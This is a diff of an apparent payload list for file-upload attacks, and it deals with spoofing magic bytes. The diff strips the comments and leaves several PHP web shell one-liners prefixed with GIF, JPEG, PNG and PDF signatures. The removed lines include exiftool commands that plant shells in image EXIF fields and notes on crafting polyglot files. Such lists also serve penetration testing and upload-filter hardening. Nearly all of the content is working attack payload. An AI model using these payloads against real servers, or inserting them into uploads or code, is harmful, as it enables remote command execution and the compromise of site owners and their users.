@@ -1,50 +1,12 @@
-# ============================================================
-# Upload — Magic Bytes / File Signature Spoofing
-# ============================================================
-
-# ---- JPEG Magic Bytes (hex prefix) ----
-# FF D8 FF E0 — prepend to PHP shell to fake JPEG
-# Example: \xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>
 FF D8 FF E0
 
-# ---- PNG Magic Bytes ----
-# 89 50 4E 47 0D 0A 1A 0A
 89 50 4E 47 0D 0A 1A 0A
 
-# ---- GIF Magic Bytes ----
 GIF89a;<?php system($_GET['cmd']); ?>
 GIF8;<?php system($_GET['cmd']); ?>
 GIF87a<?php system($_GET['cmd']); ?>
 
-# ---- PDF Magic Bytes ----
 %PDF-1.4
 %PDF-<?php system($_GET['cmd']); ?>
 
-# ---- ZIP Magic Bytes ----
-# PK\x03\x04
-
-# ---- BMP Magic Bytes ----
-# 42 4D
-
-# ---- SWF Magic Bytes ----
-# 46 57 53 (FWS)
-# 43 57 53 (CWS)
-
-# ---- Polyglot JPEG+PHP ----
-# Craft a valid JPEG file with PHP code in EXIF comment field
-# Use exiftool: exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
-# Then rename: image.jpg -> image.php.jpg
-
-# ---- Polyglot GIF+PHP (most common) ----
 GIF89a<?php system($_GET['c']); ?>
-
-# ---- Polyglot PNG+PHP ----
-# Inject PHP into PNG tEXt chunk using:
-# python -c "import struct, zlib; ... (craft tEXt chunk with PHP payload)"
-
-# ---- IDAT chunk injection (PNG) ----
-# Tools: exiftool, pngcrush, binwalk
-
-# ---- EXIF Injection (for ImageMagick) ----
-# exiftool -Comment="<?php echo shell_exec(\$_GET['e'].' 2>&1'); ?>" image.jpg
-# exiftool -Artist="<?php system(\$_GET['cmd']); ?>" image.jpg
